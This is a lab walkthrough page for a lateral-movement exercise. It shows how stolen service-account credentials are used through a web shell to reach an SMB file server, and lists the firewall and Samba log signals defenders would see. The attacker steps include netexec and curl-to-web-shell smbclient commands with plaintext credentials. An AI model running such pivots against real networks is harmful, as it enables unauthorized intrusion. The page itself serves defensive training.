# Phase 4 — Lateral movement (web01 → filesrv over SMB)

> Reference scenario — authorized lab use only. See [`../DISCLAIMER.md`](../DISCLAIMER.md).

## Video concept

Lateral movement (kill chain step 6) and the video's "workstation may speak
file sharing to this one server" firewall rule: the DMZ→servers allowlist
lets `web01` reach `filesrv` on 445 and nothing else — so the attacker moves
through the one door that exists.

## Objective

Use the `svc_web` credentials harvested in phase 3 to authenticate to the
file server through the allowed SMB path, enumerate the shares, and confirm
that the `critical` share rejects the web-tier account — lateral movement
succeeds at the network layer and stops at the authorization layer.

## Attacker steps

```bash
# 1) First show the blocked path: the same move launched directly from the
#    attacker container never crosses the perimeter.
docker exec -it attacker bash
timeout 20 netexec smb 10.10.30.11 -u svc_web -p 'Web#Svc2026!' --shares
#   expected: hangs and dies on `timeout` - the edge drops it (FW-05/FW-06),
#   and the blue team gets an FW-EDGE-DENY line for the attempt.

# 2) The real path: pivot through the web shell on web01 (DMZ -> filesrv 445
#    is allowed by FW-07).
#    Authenticate and list shares with the leaked service account:
curl -s -b /tmp/ck.txt -X POST \
  --data-urlencode "cmd=smbclient -L //10.10.30.11 -U 'svc_web%Web#Svc2026!'" \
  "http://172.31.100.1/console?token=DEV-2026"
#   expected: Sharename list - public, critical, IPC$

# 3) Read access on the public share works:
curl -s -b /tmp/ck.txt -X POST \
  --data-urlencode "cmd=smbclient //10.10.30.11/public -U 'svc_web%Web#Svc2026!' -c 'ls'" \
  "http://172.31.100.1/console?token=DEV-2026"
#   expected: old-runbook.txt and directory listing (a decoy worth reading in phase 5)

# 4) The critical share refuses the web-tier account:
curl -s -b /tmp/ck.txt -X POST \
  --data-urlencode "cmd=smbclient //10.10.30.11/critical -U 'svc_web%Web#Svc2026!' -c 'ls'" \
  "http://172.31.100.1/console?token=DEV-2026"
#   expected: NT_STATUS_ACCESS_DENIED - the share ACL (valid users = fileshare)
```

The two-step shape is the lesson: the firewall decided *which host* the
attacker could reach (filesrv:445, through FW-07); the file server decided
*which account* could read what (`valid users`). Both layers matter.

## What the blue team sees

| Signal | Where | Sample line | Detection |
|---|---|---|---|
| Blocked direct attempt | fw log | `FW-EDGE-DENY: IN=eth0 OUT=eth3 SRC=172.31.100.3 DST=10.10.30.11 ... DPT=445` | SIEM rule 100900 |
| Allowed pivot (FW-07 counter) | fw counters | `ip daddr 10.10.30.11 tcp dport 445 ... counter packets 12 bytes 1224 accept` | `docker exec fw nft -a list chain inet filter forward` |
| svc_web SMB sessions | filesrv audit | `Jan 15 03:05:31 filesrv smbd_audit: svc_web|10.10.10.5|public|connect|ok|public` | full_audit log; service-account logon from the DMZ is the IoA |
| Denied critical access | filesrv smbd log | auth failure lines for svc_web on `critical` in `/var/log/samba/log.smbd` | share-ACL denials |

```bash
# Blue-team commands:
docker logs fw 2>&1 | grep 'FW-EDGE-DENY' | grep 445 | tail
docker exec filesrv grep 'svc_web' /var/log/samba/audit.log | tail
docker exec fw nft -a list chain inet filter forward | grep 'FW-07'
```

## IOC vs IoA box

- **IOC (artifact):** the `svc_web` session from `10.10.10.5` in the filesrv
  audit log — a web-tier service account appearing on a file server is a
  high-fidelity indicator in any environment.
- **IoA (behavior):** an interactive SMB session *from the DMZ* using a
  service identity: service accounts do not browse shares; people (or
  attackers) do.

## Kill chain position

Step 6 — lateral movement (via the pivoted SMB path), demonstrating why the
video insists segmentation rules and share ACLs are separate controls.
